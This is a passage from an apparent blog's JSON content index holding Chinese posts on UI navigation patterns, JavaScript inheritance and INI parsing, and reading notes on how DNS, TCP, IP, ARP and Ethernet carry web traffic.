字段加1；如果不同，说明查询之后这条记录被更新过了，需要报错并另外处理；","categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"交互设计模式：导航-面包屑","slug":"交互设计模式：导航-面包屑","date":"2017-11-15T14:06:06.000Z","updated":"2024-09-22T23:08:41.987Z","comments":true,"path":"2017/11/15/交互设计模式：导航-面包屑/","permalink":"http://example.com/2017/11/15/%E4%BA%A4%E4%BA%92%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%9A%E5%AF%BC%E8%88%AA-%E9%9D%A2%E5%8C%85%E5%B1%91/","excerpt":"","text":"问题场景在层级结构中，用户需要知道他所处的位置，以及能够返回上一级 解决方法使用面包屑，展示出各个级别（从顶级到当前级），并允许对每一级进行点击跳转 适用场景 网站有多层级结构（不少于3级）； 中型到大型的网站，如电商、产品目录、入口网站（如网址导航）、企业网站； 配合主导航，主导航允许用户跨越不同分支； 需要一次性回退多个层级，而非逐级回退； 用户不熟悉网站的层级； 设计要点 路径显示当前页面所在的层级结构；每一层级使用一个标签，做成可点击的链接； 当面页面的标签要突出标注，并且不可点击（以便让用户知道所处的位置）； 不要用当前页的标签，做为本页面的唯一标题，需要单独再放置一个标题； 层级间使用&#x2F;或&gt;进行区隔； 如果路径很长，中间可以使用省略号…隐藏部分内容； 路径单独放置在一块区域中，占据整个内容页面的宽度 放置在靠近内容的区域，建议在内容之上，内容标题之下； 利弊分析 面包屑可以告诉用户所在的位置，并展示出网站的层级，方便用户认知； 占据空间小，能够留更多空间给内容； 使用链接式标签，使用户可以层级间跳跃浏览； 面包屑不做为主导航，需要配合主导航使用； 用户测试显示面包屑很少出现麻烦，总会有部分用户使用，因此可以说有益无害； 创意改进面包屑结合飞出菜单，用来展示标签下的次级导航；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"设计","slug":"设计","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1/"}]},{"title":"交互设计模式：导航-手风琴","slug":"交互设计模式：导航-手风琴","date":"2017-11-14T14:17:37.000Z","updated":"2024-09-22T23:08:43.601Z","comments":true,"path":"2017/11/14/交互设计模式：导航-手风琴/","permalink":"http://example.com/2017/11/14/%E4%BA%A4%E4%BA%92%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%9A%E5%AF%BC%E8%88%AA-%E6%89%8B%E9%A3%8E%E7%90%B4/","excerpt":"","text":"问题场景 用户想通过导航找到某个项目 解决方法 使用手风琴导航，将多个面板垂直或者水平叠加到一起，展开其中一个面板，缩起其他面板； 适用场景 常做为主导航或者次级导航； 本质上类似标签导航；可做为导航树的替代方案； 经常有人在操作向导中使用手风琴，但其实并不合适； 用在FAQ非常合适； 如果设置项目不多的话（少于10个），用来管理设置项也不错； 设计要点 一次只展开一个面板（如果可以展开多个，则叫做导航树或可关闭面板）； 通过点击面板头部来切换不同的面板； 垂直手风琴展开后，一般展示次级项目；水平手风琴则可以放置大段内容； 注意事项 适当的动画效果，以便让用户知道发生了什么事情（动画时间少于250ms） 支持键盘上下方向键； 展开的面板应高亮显示，以便与缩起的面板进行区分； 确保面板尺寸能够根据内容自适应，因为如果高度固定，当内容项很少于，会导致面板很空； 利弊分析 优点：可以将大量元素压缩在有限的空间内进行展示；元素包括：次级项目、问题、属性； 缺点：做为主导航时，大部分元素被隐藏，可见性较弱 其他 垂直排列的方式很常见，但动画效果经常做得不好；水平式很少见，但可以带来一些乐趣；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"设计","slug":"设计","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1/"}]},{"title":"js 函数作为参数不带括号","slug":"js 函数作为参数不带括号","date":"2017-11-12T09:33:00.000Z","updated":"2024-09-21T23:15:13.247Z","comments":true,"path":"2017/11/12/js 函数作为参数不带括号/","permalink":"http://example.com/2017/11/12/js%20%E5%87%BD%E6%95%B0%E4%BD%9C%E4%B8%BA%E5%8F%82%E6%95%B0%E4%B8%8D%E5%B8%A6%E6%8B%AC%E5%8F%B7/","excerpt":"","text":"将函数做为参数传递给另外一个函数时，该函数不用写括号，原因：如果写了括号，相当于把函数的执行返回结果，做为参数传入，而不是传入一个函数对象本身了。 function A(); function B(func, args); // 注意区分B(A, args) 和 B(A(), args) 二者的区别；","categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"js 类的继承","slug":"js 类的继承","date":"2017-11-12T09:31:02.000Z","updated":"2024-09-21T23:15:23.958Z","comments":true,"path":"2017/11/12/js 类的继承/","permalink":"http://example.com/2017/11/12/js%20%E7%B1%BB%E7%9A%84%E7%BB%A7%E6%89%BF/","excerpt":"","text":"方法一：通过使用构造函数，prototype，inherit 和 method 方法来实现类的继承； 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970//定义一个通用的 clone 函数，用来克隆一个新对象，该新对象以参数传入 的对象为原型；function clone(object)&#123; function OneShotConstructor()&#123;&#125;; OneShotConstructor.prototype = object; // 将对象做为构造函数的原型； return new OneShotConstructor();&#125;//定义 inherit 和 method 方法// 通过参数传入构造函数，以其原型克隆出一个对象，并将其作为当前对象的原型，实现了继承；Object.prototype.inherit = function(baseConstructor)&#123; this.prototype = clone(baseConstructor.prototype); this.prototype.constructor = this;&#125;// 给对象定义了一些 method 的方法，该方法使得对象可以将传入的函数，添加成为它自己的方法；Object.prototype.method = function(name, func)&#123; this.prototype[name] = func;&#125;//写个例子function Item(name)&#123; this.name = name;&#125;;Item.prototype.inspect = function()&#123; alert(&quot;It is &quot; + this.name + &quot;.&quot;);&#125;;Item.prototype.kick = function()&#123; alert(&quot;Klunk!&quot;);&#125;;Item.prototype.take = function()&#123; alert(&quot;you cannot lift &quot; + this.name + &quot;.&quot;);&#125;;var lantern = new Item(&quot;the brass lantern&quot;);function DetailedItem(name, details)&#123; this.name = name; this.details = details;&#125;;DetailedItem.inherit(Item);DetailedItem.method(&quot;inspect&quot;, function()&#123; alert(&quot;you see &quot; + this.name + &quot;,&quot; + this.details + &quot;.&quot;);&#125;);var giantSloth = new DetailedItem(&quot;the giant sloth&quot;, &quot;it is quietly hanging from a tree, munching leaves&quot;); function SmallItem(name)&#123; this.name = name;&#125;;SmallItem.inherit(Item);SmallItem.method(&quot;kick&quot;, function()&#123; alert(this.name + &quot; files across the room.&quot;);&#125;);SmallItem.method(&quot;take&quot;, function()&#123; alert(&quot;you take &quot; + this.name + &quot;.&quot;);&#125;);var pencil = new SmallItem(&quot;the red pencil&quot;);pencil.kick(); 方法二：把原型放到一个对象中做为类，然后通过 create 方法来实例化，通过 extend 来创建子类；这种方法的好处是可以忽略 prototype 的使用；123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566//定义 extend 和 create 方法// 给对象定义了一个 create 方法，该方法使得对象可以复制一个子对象出来；并且这个子对象还会// 根据传入的参数，调用继承自父对象的 construct 方法，进行自己的初始化；Object.prototype.create = function()&#123; var object = clone(this); if (object.construct != undefined) object.construct.apply(object, arguments); return object;&#125;// 给对象定义了一个 extend 方法，该方法会创建一个子对象，并将传入的对象的所有属性，复制一份到子对象上；Object.prototype.extend = function(properties)&#123; var result = clone(this); forEachIn(properties, function(name, value)&#123; result[name] = value; &#125;); return result;&#125;//写个相同的例子var Item = &#123; construct: function(name)&#123; this.name = name; &#125;, inspect: function()&#123; alert(&quot;It is &quot; + this.name + &quot;.&quot;); &#125;, kick: function()&#123; alert(&quot;Klunk!&quot;); &#125;, take: function()&#123; alert(&quot;You cannot lift &quot; + this.name + &quot;.&quot;); &#125;&#125;var lantern = Item.create(&quot;the brass lantern&quot;);var DetailedItem = Item.extend(&#123; construct: function(name, details)&#123; Item.construct.call(this, name); this.details = details; &#125;, inspect: function()&#123; alert(&quot;you see &quot; + this.name + &quot;,&quot; + this.details + &quot;.&quot;); &#125;&#125;);var giantSloth = DetailedItem.create(&quot;the giant sloth&quot;, &quot;it is quietly hanging from a tree, munching leaves&quot;); var SmallItem = Item.extend(&#123; kick: function()&#123; alert(this.name + &quot; files across the room.&quot;); &#125;, take: function()&#123; alert(&quot;you take &quot; + this.name + &quot;.&quot;); &#125;&#125;);var pencil = SmallItem.create(&quot;the red pencil&quot;);pencil.take(); 总结：不管是第1种的 inherit 方法，还是第二种的 create 方法，它们都是通过将父对象做子对象的原型来实现的继承，区别在后者对 prototype 的使用进行了封装，不需要老是打 protoype 这个单词， 降低了出错概率，更好的实现了概念的抽象；","categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"js 解析 ini 文件","slug":"js 解析 ini 文件","date":"2017-11-12T09:27:12.000Z","updated":"2024-09-21T23:15:19.085Z","comments":true,"path":"2017/11/12/js 解析 ini 文件/","permalink":"http://example.com/2017/11/12/js%20%E8%A7%A3%E6%9E%90%20ini%20%E6%96%87%E4%BB%B6/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536// 解析 ini 文件function splitLines(string)&#123; return string.split(/\\r?\\n/);&#125;function parseINI(string)&#123; var lines = splitLines(string); var categories = []; function newCategory(name)&#123; var cat = &#123;name: name, fields: []&#125;; categories.push(cat); return cat; &#125; var currentCategory = newCategory(&quot;TOP&quot;); forEach(lines, function(line)&#123; var match; if (/^\\s*(;.*)?$/.test(line))&#123; return; &#125; else if (match = line.match(/^\\[(.*)\\]$/))&#123; currentCategory = newCategory(match[1]); &#125; else if (match = line.match(/^(\\w+)=(.*)$/))&#123; currentCategory.fields.puch(&#123;name: match[1], value: match[2]&#125;); &#125; else&#123; throw new Error(&quot;Invalid line: &quot; + line); &#125; &#125;); return categories;&#125;","categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"js 如何避免使用全局变量","slug":"js 如何避免使用全局变量","date":"2017-11-12T09:01:38.000Z","updated":"2024-09-21T23:15:30.772Z","comments":true,"path":"2017/11/12/js 如何避免使用全局变量/","permalink":"http://example.com/2017/11/12/js%20%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E4%BD%BF%E7%94%A8%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F/","excerpt":"","text":"为了避免使用全局变量，有两个办法 办法一：设计一个函数，并将函数内的方法添加到全局对象 window 上（这种方法虽然可以避免全局变量，却难免要应对全局对象上方法的命名冲突） 办法二：设计一个对象，对象里面存着变量和方法，但它不直接通过定义获得（不然会变成全局变量），而是通过定义匿名函数并马上运行它来返回所需要的对象","categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"网络是怎样连接的","slug":"网络是怎样连接的","date":"2017-11-12T09:01:38.000Z","updated":"2024-09-22T23:08:43.597Z","comments":true,"path":"2017/11/12/网络是怎样连接的/","permalink":"http://example.com/2017/11/12/%E7%BD%91%E7%BB%9C%E6%98%AF%E6%80%8E%E6%A0%B7%E8%BF%9E%E6%8E%A5%E7%9A%84/","excerpt":"","text":"前言 浏览器生成消息生成 HTTP 请求消息从输入网址开始URL 网址开头部分为协议，常见协议有： http：访问远程 Web 服务器，例如：http://user:password@www.glass.com:80/dir/file1.html，注意 URL 中可携带用户名和密码，一般都为可省略 ftp：下载或上传文件；同样可以携带用户名和密码（可省略）； file：读取本地文件； mailto：发送电子邮件；例如：mailto:&#x74;&#111;&#110;&#x79;&#64;&#x67;&#108;&#x61;&#x73;&#x73;&#x2e;&#x63;&#x6f;&#x6d;，冒号后的部分为邮件地址； news：阅读新闻组的文章，例如：news: comp.protocols.tpc-ip，冒号后的部分为新闻组名称； 浏览器先解析 URL 省略文件名的情况 http://www.lab.glass.com/dir/，末尾有斜杠，但没有文件名，因此访问目录中的默认文件，一般名称为 index.html 或者 default.html； http://www.lab.glass.com/dir，末尾没有斜杠，先将 dir 作为文件名来处理，如果找不到，再将其当作目录名来处理； HTTP 的基本思路HTTP 是发送数据的一种报文格式规范，由报头和消息体两部分组成，报头是必须的，消息体根据情况是可选的；消息体的格式可以有很多种，以支持不同形式的数据，格式在头部的 content-type 字段中备注； 报头由必要的请求行（首行）和一些可选的字段组成。首行的信息有： 方法：GET，POST，PUT 等； URI：资源路径，例如 &#x2F;dir&#x2F;file.html； 协议版本：例如 HTTP1.1 生成 HTTP 请求消息 发送请求后会收到响应响应的格式和请求基本一致，也是由报头+可选的消息体组成，报头由响应行+可选的头字段组成；响应行由协议版本+状态码+说明组成，例如 HTTP&#x2F;1.1 200 OK； 向 DNS 服务器查询 Web 服务器的 IP 地址IP 地址的基本知识整个互联网实际上是由各种小的局域网组成的。每个小的局域网络通过一台路由器对外发放和接受数据，内部则由路由器为各终端设备分配内部 IP 地址进行管理； 域名和 IP 地址并用的理由IP 地址不好记，而且同一个网站可能会有多个 IP 地址，同时由于设备的宕机和维护，IP 地址还会变动，因此使用人们更容易记住的域名来访问网站是一种更加健壮的方案； Socket 库提供查询 IP 地址的功能操作系统内置的 socket 库提供了查询 IP 地址的功能，这样应用程序只需直接调用该库的功能，即可将域名解析成 IP 地址； 通过解析器向 DNS 服务发出查询由于 socket 是使用 C 语言编写的，让它被调用时，实际的过程是预先分配一段内部，用来存储后续的结果，然后解析器向 DNS 服务器发出请求，并在得到解析结果后，将其写入预先分配的内存地址中； 域名解析：resolution，解析器：resolver 解析器的内部原理 DNS 服务器的地址可以有多个来源，例如： 由 ISP 运营商提供； 由用户手工在路由器中提供； 由用户手工在网卡的属性中进行设置； 全世界 DNS 服务器的大接力DNS 服务器的基本工作DNS 服务器的工作本质即使就是维护一张域名和 IP 地址的映射记录表。当收到一个域名解析请求后，就在表中分组查询询对应类型的 IP 地址。如果找不到，就将请求转发给下级域名的服务器进行查找； 注意：这里有一个很重要的点，即 DNS 服务器的解析是分级。不同级的映射记录有可能存储在同一台服务器上面，也有可能存储在不同的服务器上面；另外解析记录还区分类型，例如 A 类型，MX 邮件类型，CNAME 别名类型等； 域名的层次结构域名是分层次的，每一层使用点号隔开，例如 www.baidu.com.cn，其中 cn 是国家级别的域名，com 是商业类型域名，baidu 则是域名申请者的自定义名称，www 是域名申请者的内部子域名； 寻找相应的 DNS 服务器并获取 IP 地址 通过缓存加快 DNS 服务器的响应 为了加快响应速度，一般 DNS 服务器上面有会缓存机制，将最近的查询结果缓存起来，这样再收到相同的解析请求时，就可以立即返回结果，而无须再次对外发起请求了； 委托协议栈发送消息数据收发操作概览 创建套接字阶段套接字本质上其实是一个存在于内存中的对象，该对象有多个字段，每个字段存放着管理连接的有关信息，例如 IP 地址、连接状态等；因为网络在本质上是不可靠的，数据在传输过程中会出现丢失或中断，因此需要在本地记录当前的连接状态，这样当发生意外时，仍然能够正常工作； 当应用程序调用 socket 库创建套接字后，被调用的函数会返回一个文件描述符，用来代表该套接字对象，这样应用程序后续的操作，都可以向读写文件一样，与套接字对象进行交互； 连接阶段‘连接’相对当于客户端和服务器之间的一种准备工作，对方交换一下必要的信息和状态，例如起始字节等；交换成功后，即表示网络是畅通的，并进入了可通信的阶段； 由于套接字返回的文件描述符是本地的，因此无法在本机之外使用。因此需要使用端口号来解决这个问题，因为一台机器上，不管是本地计算机，还是远程服务器，正常都会有多个应用程序进行互联网通信，因此需要使用端口号机制来区分不同的应用程序； 通信阶段当连接成功后，应用程序即可调用 socket 库中的 write 函数，将数据写入套接字返回的文件描述符，并使用 read 函数远程服务器返回的响应； 断开阶段当客户端收到服务器返回的响应后，本次连接即告结束，但这时不一定马上调用 close 函数断开连接，有两方面的原因： 有可能在返回的响应中，发现需要额外的请求数据，例如网页上的图片； 有可能应用程序没有马上读取返回的数据，如果马上释放文件描述符，又恰好被操作系统分配给了另外的应用程序，会导致原应用程序无法读取到数据，或者其他应用程序读取到本不属于自己的数据； 用电信号传输 TCP&#x2F;IP 数据创建套接字协议栈的内部结构 套接字的实体就是通信控制信息套接字的本质就是内存中存放着的一段类似对象的数据结构，该数据结构保存着控制整个连接的各项重要信息，例如连接的源地址、目标地址、端口号、各种连接状态等；各个 socket 函数在需要的时候，就会从该对象读取所需要的信息，来完成自身的工作。并在工作完成后，改写信息，标记最新的状态； 调用 socket 时的操作 连接服务器连接是什么意思所谓连接实际是在做建立通信的初始化动作，这些动作包括准备好发送方和接收方的 IP 地址、端口号、状态、内存分配、MAC 地址等事宜； 负责保存控制信息的头部TCP 协议报文的头部数据来源于在上一步的连接阶段初始化好的那些数据（存放在 socket 对象中），主要字段如下： 发送方的端口号：16bit 接收方的端口号：16bit 序号：32bit，告知对方当前发送的数据包在所有数据包中的序号； ACK 号：32bit，告知对方已经收到哪个序号的包了，因此一般是接收方发给发送方才使用； 数据偏移量：4bit，告知对方主体数据在当前数据包的起始位置，因此变相也是头部的长度； 保留字段：6bit 控制位：6bit，告知对方连接指令，包括 RST：告知对方将强制断开连接 SYN：告知对方将建立连接； FIN：告知对方将断开连接； 窗口：16bit，告知对方当前可用窗口大小； 校验和：16bit，方便对方检查数据是否有错误 紧急指针：16bit，告知对方应紧急处理的数据位置（说实话暂时不知道有啥使用场景）； 可选字段：长度不固定，较少使用； 连接操作的实际过程 客户端的 TCP 模块从 socket 对象中读取需要的值，组成 TCP 报文头部。之后由 IP 模块接手，添加 IP 报文头部，最后交给网卡驱动程序，将数据转成电信号发送出去（此阶段会告知服务端自己的 ACK 序号初始值和窗口大小）。 服务端的网卡驱动程序接收到电信号，转成数据后交给 IP 模块解析出 TCP 报文，之后再转给 TCP 进一步解析出数据；服务端按相同的方式发送报文给客户端（此阶段会告知客户端自己的 ACK 序号初始值和窗口大小）； 客户端收到后，将 socket 对象中的 syn 字段值更新为 1，表示客户端到服务端的通信建立成功；并再次发送 ACK 报文给服务端； 服务端收到后，也将其 socket 对象中的 syn 字段值更新为1，表示服务端到客户端的通信建立成功； 收发数据将 HTTP 请求消息交给协议栈协议栈并不关心所要发送的内容是什么，无论内容是什么，都看作是一定长度的二进制序列即可； 由于协议栈无法预知应用程序是一次性将数据全部给过来，还是分多次给。因此，在收到数据后，它不一定马上将数据发送出去，而是先将数据放到缓冲区中，然后根据情况来处理； 如果收到的数据大于或接近包的最大数据容量（MSS，MTU 扣减头部后的值），则马上将数据发出去，因为多等也无意义； 如果收到的数据小于包的最大容量，则看一下计时器，是否超过了最长可等待时间： 如果没超过，就再等等； 如果超过了，就把包发出去，即使还没有满； 由于应用程序对自己的数据最了解，而栈议栈并不了解，因此协议栈提供了参数选项，应用程序可传递参数给协议栈，告知其准确高效的发送办法； 对较大的数据进行拆分当所要发送的数据超过了 MSS 时，就需要对包进行拆分，为每个包加上必要的头部信息，示例如下： 使用 ACK 号确认网络包已收到数据包发送出去后，发送方的事情并没有就到此结束，它还需要确认对方是否已经收到；如果没有收到，需要重新发送，直到对方收到为止； 为了让接收方知道当前数据包的序号，发送方会将当前包中数据在完整数据中的偏移量放在头部中，作为序号信息，这样接收方收到该包后，马上就知道这段数据，应该放置在整体数据的具体位置；另外，由于头部中还有一个字段是记录当前数据包的头部长度的，因此接收方也能够很快速的知道从数据包中的哪个具体位置开始读取数据； 根据网络包平均往返时间调整 ACK 号等待时间发送方需要等待接收方返回 ACK 号，然后再判断是否需要重发。这个等待时间的大小很有讲究，因为太大或太小都需要付出代价；太大的，等待过久，用户体验不好；太小的话，重复发送，导致网络堵塞，最终网络速度变慢，同样用户体验不好； 由于 ACK 的返回速度跟接收方的地理位置有关，理论上双方离得越远，返回的就越慢，因此最好的办法是根据实际情况，动态设置 ACK 等待时间； 使用窗口有效管理 ACK 号当有了 ACK 等待时间后，在 ACK 号返回前，如果傻傻的等待，啥事也不做，显然有点浪费资源，因此便产生了滑动窗口的概念。它的意思是根据窗口大小，一次发出一批多个包，然后在收到接收方的 ACK 信号后，再发送下一批； 由于接收方为接收数据所分配的缓冲区大小是有上限的，因此当到达的数据过快过多，而数据又未能被及时处理并清空缓冲区的话，就有可能导致缓冲区溢出。为了避免这个情况，接收方会在一开始将自己可用的缓冲区大小告知发送方。发送方在收到该信息后，在不超过该值的情况下，发送合适数量的数据包出去，然后等待接收方下一次告知可用缓冲区大小后，再开始新一轮的发送动作； 虽然这张图显示的好像发送方有等待的情况出现，但在现实情况中，由于接收方的处理速度往往远大于网络速度，因此这种等待的情况不常出现（除非应用程序不来及时取走数据）。接收方在收到数据并清空缓冲区后，发送方的下一个包经常还没有到达，因此接收方发出的窗口大小仍然是完整的大小； ACK 与窗口的合并如果接收方每次收到包就马上发送 ACK 号，每次缓冲区大小出现变化，就马上发送新的窗口大小，则接收方发送的包数量将大大增加，从而增加网络堵塞的风险。为了降低这种网络，接收方会设置一段等待时间，在该段等待时间内，如果出现多条 ACK 消息和多个窗口消息，则可以将它们合并成一条，这样就可以有效的提高传输效率； 接收 HTTP 响应消息应用程序（如浏览器）在发出请求后，会紧接着调用 read 函数从缓冲区中读取数据，但由于数据没有那么快就回来，因此协议栈会先将该操作挂起，等待数据回来后（发触发事件），然后结束挂起，开始读取数据； 在收到数据后，发送方的协议栈所做的事情如下： 收到包，开始解析包，检查数据是否完整； 如果完整，给发送方发 ACK 信号；如果不完整，丢弃该包； 将包中的数据暂存到缓冲区，回到第一步，解析下一个包，直到解析完已收到的所有包； 将已到达的多个数据包组装还原成连续的数据，写入应用程序指定的内存地址，清空缓冲区； 给发送方发送新的窗口（可用缓冲区）大小； 从服务器断开并删除套接字数据发送完毕后断开连接断开连接的时机和操作由应用程序（接收和发送的任意一方都可以）来决定的，因为协议栈无法知道什么数据算是发送完了。一般来说，完成发送的一方会断开连接（Web 程序一般是由服务器来断开，因为它最清楚本次请求的数据是否已经发送完毕了，客户端反而不是第一时间知道）； 当服务端想要发起断开连接的操作时，只需调用 socket 库中 的 close 函数，它会生成一个只有头部没有主体的 TCP 数据包，包头部中的 FIN 字段值会设置为 1，表示 FINISH 为 True，然后将该包交给 IP 模块发送出去； 客户端在收到该 FIN 包后，会更新 Socket 对象中的状态字段，以标记为断开状态，然后发一个 ACK 包给服务端，表示自己收到 FIN 包了； 之后当应用程序调用 read 函数来读取数据时，如果缓冲区中有数据，就将数据交给应用程序，直至清空缓冲区 ；如果没有数据，则给应用程序返回信号，告知应用程序数据已经全部接收完毕了，没有更多的数据了。然后应用程序会调用 socket 库的 close 函数，关闭连接。此时客户端会发送一个 FIN 包给服务端；服务端收到该 FIN 包后，会返回一个 ACK 信号； 删除套接字当连接断开后，双方的套接字并不会立即删除，而是会保留一段时间后（一般是几分钟）再删除。之所以如此，是为了避免出现异外情况。例如客户端在收到服务端的 FIN 包后，会返回一个 ACK 信号给服务端，但有可能该 ACK 在网络中丢失了。因此过了一段时间服务端会重发一次 FIN 信号。如果客户端在发出 ACK 信号后，即将套接字删除，并将端口分配给一个新的应用程序，则有可能导致该应用程序收到服务端的 FIN 包，导致连接出错； 数据收发操作小结 IP 与以太网的包收发操作包的基本知识 MAC 头部也是由 IP 协议栈来写入的，IP 协议栈将下一个转发设备的 MAC 地址作为 MAC 头部的字段。之后以太网协议根据这个 MAC 头部，就可以知道应该将数据包发给哪台转发设备；因此，在整个传输过程中，MAC 头部的信息是不断变化的，由当前转发设备改写它，改写后的新内容是下一个转发设备的 MAC 地址； 转发设备在收到数据包后，会先去掉 MAC 头部，然后查看里面的目的地服务器的 IP 地址，然后基于该 IP 地址，从自己维护的映射表中，找到下一个转发设备的 MAC 地址，然后为数据包添加新的 MAC 头部； 此处基于以太网来举例，所以用到了 MAC 头部。当数据包在某个非以太网的网络中进行传输时，转发设备就会按照不同的协议规定，为其添加相应的头部，例如无线网、ADSL等，以便该数据包在新的网络中，也可以进行传输。这就是分层的好处，某一层的改变，不会影响到其他层，从而在使用过程中可以非常的灵活，任意的组合，兼容各种使用场景； 包收发操作概览当收到 TCP 数据包后，IP 模块需要为其添加两个头部，分别是 IP 头部（带 IP 地址）和 MAC 头部（带 MAC 地址）；IP 模块并不关心 TCP 包的类型（控制包、数据包）和内容，一视同仁，处理方式完全一样； 生成包含接收方 IP 地址的 IP 头部IP 头部主要字段如下： 版本号：4 bit，IP 协议版本号，例如 IPv4 还是 IPv6； 头部长度 IHL：4 bit，由于存在可选字段，头部长度是动态的，因此需要有字段来标注长度； 服务类型 ToS：8 bit，包传输的优先级； 总长度：16 bit，整条 IP 消息的总长度； ID 号：16 bit，用来标识包的编号，类似于序列号；如果包被分片，则所有分片的 ID 号会相同，以便识别它们属于同一个包； 标志 Flag：3 bit，表示当前包是否允许分片，以及是否存在分片； 分片偏移量：13 bit，表示当前分片从整条 IP 消息的起始位置； 生存时间 TTL：8 bit，为了避免出现 网络回环时，包在网络中被无限制的传递下去；每经过一个中转设备，该值就会减 1，当减为 0 后，就不转发该包，而是直接丢弃（貌似该值可用来判断包被转发了多少次？）； 协议号：8 bit，用来表示 TCP、UDP、ICMP 等协议信息； 头部检验和：16 bit，用来数据完整性，据说现在已经弃用； 发送方 IP 地址：32 bit 接收方 IP 地址：32 bit 其他可选字段：很少使用； IP 地址并非分配给计算机的，而是分配给网卡的，因此一台计算机有多个网卡时，就可以拥有多个 IP 地址；例如笔记本电脑既支持有线连接，也支持无线连接，因此其实它配备了两张网卡，如果两种连接都启用的话，会有两个 IP 地址； 当计算机拥有多张网卡和多个 IP 时，如果判断数据包应该交给哪张网卡进行转发呢？答案是使用路由表（route table）；路由表中记载着转发规则，其中会有一条通用规则，当其他规则都无法匹配时，就使用该通用规则来转发。通用规则一般表示默认网关，它的目标地址和掩码都是 0.0.0.0； 路由表一般有下面几列： Destination：表示目标地址； Netmask：表示掩码，用来和 TCP 告知的目标 IP 地址进行掩码计算，再根据计算结果匹配对应的 Destination； Gateway：表示路由器的 IP 地址； Interface：表示负责发送数据包的网络接口（即网卡），当匹配成功时，就会在 IP 头部中填写该 Interface 的 IP 地址作为发送方地址，然后将数据包交给该网卡进行发送；发送的目的地即是 Gateway（此处的目的地猜测不是去改写 TCP 包中的目标 IP 地址，而是在 MAC 头部中填写该 Gateway 对应的 MAC 地址）； Metric：表示线路的传输成本，值越高，表示距离 越远； IP 模块在给数据包添加 IP 头部和 MAC 头部前，需要先到路由表中查询对应的信息，之后才有办法生成头部； 生成以太网用的 MAC 头部MAC 头部主要有以下几个字段： 接收方的 MAC 地址：48 bit，不像 IP 地址有层级结构，整个地址是一个整体，没有层级规律； 发送方的 MAC 地址：48bit，网卡自带的 MAC 地址； 以太类型：表示不同的协议，例如 ARP协议、IPv6 协议、IP 协议、IEEE802.3 协议等； 通过 ARP 查询目标路由器的 MAC 地址ARP：address resolution protocol，地址解析协议，基于 IP 地址查询相应的 MAC 地址； ARP 有点类似广播机制，它会向同一子网中的所有设备广播一条查询消息；收到消息的设备，会检查自己的 IP 是否与查询信息匹配，如果匹配，就应答；如果不匹配，就保持沉默；（如果是连接到集线器的话，广播是可以理解的；但好奇如果网卡是连接到路由器而，路由器应该不会广播吧，而是直接返回结果？） 为了避免重复查询，IP 模块使用了 ARP 缓存。每次查询一条新记录后，就将结果保存到缓存中。这样下次查询的时候，先查找一下缓存中的记录，如果能够找到，就不需要对外广播查询了，提高效率； 由于外部的 IP 地址可能是动态变化，同一个 IP 地址，一段时间后，可能绑定到了一台新的设备上面。因此 ARP 缓存中的数据是会失效的。为了规避失效问题，简单粗暴的办法就是每隔一段时间，让删除缓存记录，这样就可以定期更新了；尽管如此，在刷新之前，有可能缓存记录就已经是错的了，这个时候就只能手动删除缓存来解决了； 添加 MAC 头部的动作理论上也可以交由网卡来完成，但这样会导致网卡（硬件）和网络类型耦合，降低了网卡的通用性，因此设计成由 IP 模块来完成添加 MAC 头部的动作会更加合理； 以太网的基本知识最早的以太网是设计成广播式的，以太网中的各个设备通过一条主干网线连接起来，然后任意一台设备发出的数据包，会传输给所有的设备。收到的数据包的设备检查包中的 MAC 地址是否与自己的相符，如果相符，就处理它；如果不符，就丢弃它；显然，这种方式效率有点低，后来进一步进化，衍生出了交换机。交换机作为中介接收数据包，再将数据包发给匹配的设备，不再广播给所有设备了，这样提高了处理效率； 简化来说，以太网可以视作基于 MAC 地址进行相互通讯的一个局域网络； 将 IP 包转换成电或光信号发送出去IP 模块完成添加头部的动作后，接下来就需要将数据包交给网卡驱动进行处理了。网卡驱动负责将数据写入到网卡的缓冲区，然后通知网卡内部的 MAC 模块进行发送；MAC 模块收到指令后，从缓冲区读取数据后，交给 PHY 模块转成电信号发送出去； 虽然每张网卡在出厂的时候的内置一个全球唯一的 MAC 地址，但是实际通信过程中不一定会使用它。该地址可由网卡驱动程序从网卡内置的 ROM 中读取，也可以由用户自己设置写入驱动程序，此时会忽略内置的 ROM； 给网络包再加 3 个控制数据 网卡的 MAC 模块从缓冲区读取完数据后，会为它们再次添加三个数据，分别是： 报头：56 bit，由 1 和 0 组成的比特序列；这些 1 和 0 序列转成电信号后，会出现特定形状的波形，接收方基于该波形判断什么时候开始读取数据（用来同步双方的时钟周期）； 起始桢分界符 SFD：8 bit， 也是一个特定 1 和 0 组成的序列，接收方在看到该序列时，就知道接下来的部分是主体数据了； FCS：32 